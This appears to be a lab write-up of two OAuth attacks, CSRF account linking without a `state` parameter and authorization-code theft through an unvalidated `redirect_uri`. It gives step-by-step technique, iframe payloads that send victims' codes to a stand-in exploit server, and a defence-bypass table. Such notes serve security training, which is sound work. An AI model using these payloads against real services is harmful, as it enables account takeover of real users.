# OAuth — Account linking CSRF and redirect_uri code theft

Account-linking flows that lack a `state` parameter are vulnerable to CSRF: an attacker generates an authorization code (linked to their social profile), drops the request before it's consumed, then tricks a victim into completing the linking — attaching the attacker's social profile to the victim's account. Separately, if `redirect_uri` is not validated at all, the authorization code is delivered directly to the attacker's server.

## Quick reference
```
# Lab 2 — CSRF account linking (no state param)
# 1. Click "Attach a social profile" → intercept GET /oauth-linking?code=CODE → copy URL → DROP request
# 2. Deliver iframe to victim:
<iframe src="https://LAB/oauth-linking?code=STOLEN-CODE"></iframe>
# 3. Victim's browser uses the code → attacker's social profile linked to admin account
# 4. Log in with social media → logged in as admin → /admin → delete carlos

# Lab 3 — redirect_uri code theft
# 1. Start OAuth flow → intercept GET /auth?client_id=X&redirect_uri=LAB/oauth-callback&...
# 2. Change redirect_uri to exploit server:
GET /auth?client_id=X&redirect_uri=https://EXPLOIT-SERVER&response_type=code&scope=openid profile email
# → 302 to https://EXPLOIT-SERVER?code=ADMIN-CODE
# 3. Deliver iframe to victim:
<iframe src="https://oauth-SERVER/auth?client_id=X&redirect_uri=https://EXPLOIT-SERVER&response_type=code&scope=openid%20profile%20email"></iframe>
# 4. Victim's browser follows OAuth → code in exploit server access log
# 5. Visit: https://LAB/oauth-callback?code=STOLEN-CODE → logged in as admin
```

## Root cause
- **Missing `state` (CSRF):** The `state` parameter is a CSRF token for OAuth flows. Without it, the `/oauth-linking?code=X` endpoint can be triggered cross-site by anyone who holds a valid code. An attacker obtains a code for their own social account, drops the redirect so the code isn't consumed, then delivers the URL to the victim via iframe — the victim's browser sends their session cookie, binding the attacker's social identity to the victim's account.
- **Unvalidated `redirect_uri`:** The OAuth server should enforce that `redirect_uri` matches the pre-registered value for the client. If it accepts any URL, the authorization code is sent wherever the attacker specifies.

## Find it
1. Click "Attach social profile" or any OAuth-initiating button. Intercept `GET /auth?...`.
2. Check for `state=` parameter. Absent → CSRF account linking is possible.
3. In Repeater, change `redirect_uri` to an arbitrary domain. If the OAuth server returns a code at that domain → `redirect_uri` unvalidated.
4. Check if the code-consuming endpoint (e.g. `/oauth-linking`, `/oauth-callback`) has CSRF protection of its own (token, SameSite). If not, CSRF delivery via iframe/GET works.

## Technique
**Lab 2 (CSRF account linking):**
1. Log in to the blog directly (classic login form), then go to "My account" → "Attach a social profile".
2. Burp intercepts the final redirect: `GET /oauth-linking?code=CODE`. Copy this URL. Drop the request — code is not yet consumed and remains valid.
3. Log out of the blog.
4. Exploit server: create page with `<iframe src="https://LAB/oauth-linking?code=STOLEN-CODE"></iframe>`.
5. Deliver to victim. Victim is logged in as admin; their browser follows the iframe → the code (attached to the attacker's social identity) is consumed in the admin's session → admin's account is now linked to attacker's social profile.
6. Click "Log in with social media" → logged in as admin → `/admin` → delete carlos.

**Lab 3 (redirect_uri code theft):**
1. Complete OAuth login for your own account. In Proxy history find `GET /auth?client_id=...`.
2. Repeater: change `redirect_uri` to your exploit server. Send. Observe 302 to exploit server with `code=` in query string → confirmed unvalidated.
3. Exploit server: create page with iframe pointing to the modified auth URL.
4. Deliver to victim. Victim's browser loads iframe → their browser authenticates to OAuth server (still has session) → code for admin's account redirected to exploit server access log.
5. Grab code from log. Visit `https://LAB/oauth-callback?code=STOLEN-CODE` in browser → logged in as admin → delete carlos.

## Payload arsenal
```html
<!-- Lab 2: CSRF account linking -->
<iframe src="https://LAB/oauth-linking?code=STOLEN-CODE"></iframe>

<!-- Lab 3: redirect_uri code theft - victim delivery -->
<iframe src="https://oauth-SERVER/auth?client_id=CLIENT-ID&redirect_uri=https://EXPLOIT-SERVER&response_type=code&scope=openid%20profile%20email"></iframe>
```

```
# Lab 3: use stolen code
GET https://LAB/oauth-callback?code=STOLEN-CODE
→ 302 → logged in as admin
```

## Bypasses
| Defense | Bypass |
|---|---|
| `state` present but static/predictable | Brute-force or replay known state value |
| redirect_uri whitelist | Path traversal if domain matched but path not (`/../`) |
| Code already consumed | Drop the request BEFORE it's consumed to keep code valid |
| SameSite=Lax on session cookie | CSRF via top-level navigation (iframe GET = subresource, may be blocked); try `<a>` redirect instead |

## Exploitation walkthrough
**CSRF:** Attach social → intercept code → drop → iframe to victim → victim binds attacker's social → attacker logs in as victim.

**redirect_uri:** Change redirect_uri to exploit server → iframe to victim → victim authenticates → code in log → attacker uses code.

## Chaining
- Admin account takeover → [Access-control](../../Access-control/) (delete carlos).
- CSRF on account linking = a CSRF attack → [CSRF](../../CSRF/) patterns apply.
- Stolen code → admin session → further privilege escalation.

## Tools
- **Burp Proxy** — intercept and drop the code-consuming request
- **Burp Repeater** — test redirect_uri with arbitrary values
- **Exploit server** — host CSRF iframe, receive stolen authorization code in access log

## Labs

### Forced OAuth profile linking [Practitioner]
OAuth account-linking flow has no `state` parameter. Attacker generates auth code (for their own social account), drops the consuming request, delivers `/oauth-linking?code=STOLEN` as an iframe to the victim (admin). Victim's browser sends session cookie → code consumed → attacker's social profile bound to admin account. Key insight: `state` is OAuth's CSRF token; without it, any auth code can be delivered cross-site to link an arbitrary social identity.

### OAuth account hijacking via redirect_uri [Practitioner]
`redirect_uri` parameter not validated by OAuth server — any URL accepted. Deliver victim's browser to the authorization endpoint with `redirect_uri=https://EXPLOIT-SERVER`. Victim authenticates (silent re-auth using existing OAuth session) → authorization code delivered to exploit server log. Attacker visits `/oauth-callback?code=STOLEN` → logged in as victim. Key insight: redirect_uri is the code delivery address; stealing it = stealing the account.

## Real-world notes
- Missing `state` is still found in production OAuth integrations, especially social login buttons added by marketing without security review.
- `redirect_uri` validation failures are common when OAuth libraries default to "best-effort" matching or only check scheme+host.
- An intercepted-and-dropped code approach is elegant for testing: you hold a real code but the server doesn't know it's been "used" — timing matters (some providers expire codes in 60s).
- In real engagements, always test `redirect_uri` with: arbitrary domain, subdomain of whitelisted domain, path traversal on whitelisted domain.

## References
- https://portswigger.net/web-security/oauth
- https://portswigger.net/web-security/csrf
